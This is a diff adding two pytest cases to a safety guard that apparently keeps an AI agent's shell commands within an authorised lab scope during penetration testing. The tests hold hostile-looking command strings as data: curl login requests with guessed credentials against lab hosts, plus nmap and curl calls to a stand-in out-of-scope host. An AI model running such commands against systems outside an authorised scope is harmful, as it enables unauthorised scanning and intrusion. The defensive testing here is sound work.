@@ -97,6 +97,26 @@ def test_bare_filename_not_treated_as_host(guard: SafetyGuard) -> None:
         assert guard.allow_command(cmd, step=1).permitted, cmd
 
 
+def test_email_domain_in_payload_not_treated_as_host(guard: SafetyGuard) -> None:
+    # CP1 false positive: a login payload whose value holds an email domain must not be read
+    # as a network target when the actual URL is the in-scope lab host.
+    for cmd in [
+        'curl -X POST http://10.13.37.20:3000/login -d "email=admin@juiceshop.com&password=x"',
+        'curl http://target:3000/login -d "email=admin@example.com&password=y"',
+        'curl http://10.13.37.20:3000/ -d "email=hackerone@hackerone.io"',
+    ]:
+        d = guard.allow_command(cmd, step=1)
+        assert d.permitted, f"email domain wrongly blocked: {d.reason} ({cmd!r})"
+
+
+def test_email_skip_does_not_open_egress_hole(guard: SafetyGuard) -> None:
+    # The '@' skip must not leak: a genuine bare out-of-scope FQDN (no leading '@') and an
+    # out-of-scope URL are still refused.
+    assert not guard.allow_command("nmap evil.example.com", step=1).permitted
+    off_url = 'curl http://evil.example.com/ -d "email=a@target.local"'
+    assert not guard.allow_command(off_url, step=1).permitted
+
+
 def test_decision_is_frozen() -> None:
     d = Decision(True, "ok")
     with pytest.raises(FrozenInstanceError):
